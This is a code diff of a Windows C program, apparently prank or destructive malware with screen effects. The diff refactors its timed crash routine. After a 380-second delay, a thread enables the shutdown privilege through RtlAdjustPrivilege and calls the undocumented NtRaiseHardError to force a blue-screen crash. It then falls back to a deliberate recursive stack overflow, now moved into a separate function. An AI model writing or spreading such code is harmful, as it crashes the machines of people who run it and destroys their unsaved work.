@@ -16,6 +16,7 @@
 #pragma comment(lib, "advapi32.lib")
 
 #define M_PI 3.14159265358979323846264338327950288
+#define TOTAL_EFFECTS_TIME 380000  // 6 минут 20 секунд в миллисекундах
 
 typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
 typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
@@ -1002,13 +1003,18 @@ DWORD WINAPI earthquake_shake(LPVOID lpvd) {
     }
 }
 
+// ==================== STACK OVERFLOW ДЛЯ BSOD ====================
+
+__declspec(noinline) VOID StackOverflowCrash() {
+    volatile int buffer[8192] = {0};
+    StackOverflowCrash();
+}
+
 // ==================== ПОТОК ДЛЯ BSOD ПО ТАЙМЕРУ ====================
 
 DWORD WINAPI TimerThread(LPVOID lpParam) {
-    // Ждём 6 минут 20 секунд (380 секунд)
     Sleep(TOTAL_EFFECTS_TIME);
     
-    // Вызываем BSOD
     BOOLEAN bl;
     NRHEdef NtRaiseHardError = (NRHEdef)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtRaiseHardError");
     RAPdef RtlAdjustPrivilege = (RAPdef)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlAdjustPrivilege");
@@ -1018,13 +1024,7 @@ DWORD WINAPI TimerThread(LPVOID lpParam) {
         NtRaiseHardError(0xC0000229, 0, 0, 0, 6, NULL);
     }
     
-    // Если не сработало — Stack Overflow
-    __declspec(noinline) VOID Crash() {
-        volatile int buffer[8192] = {0};
-        Crash();
-    }
-    Crash();
-    
+    StackOverflowCrash();
     return 0;
 }
 
